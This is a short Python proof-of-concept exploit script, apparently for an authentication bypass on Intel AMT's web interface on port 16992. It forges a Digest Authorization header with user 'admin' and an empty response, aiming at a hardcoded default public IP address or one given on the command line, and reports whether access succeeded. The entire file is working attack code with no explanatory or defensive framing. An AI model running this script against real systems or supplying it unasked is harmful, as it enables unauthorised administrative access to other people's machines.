#!/usr/bin/env python
import requests
import sys

if len(sys.argv) > 1:
   ip = str(sys.argv[1])
else:
   ip = '168.235.84.117'

url = 'http://'+ip+':16992/index.htm'
req = requests.get(url)
auth = req.headers['WWW-Authenticate']
words = auth.split('"')
headers = 'Digest username= "admin", realm="'+words[1]+'", nonce="'+words[3]+'", uri="index.htm", response="", qop="auth", nc="00000001", cnonce="8858482c60513ab5" '
poc = requests.get(url, headers={'Authorization': headers})
if poc.status_code == 200:
   print('Success')
else:
   print('Failed')
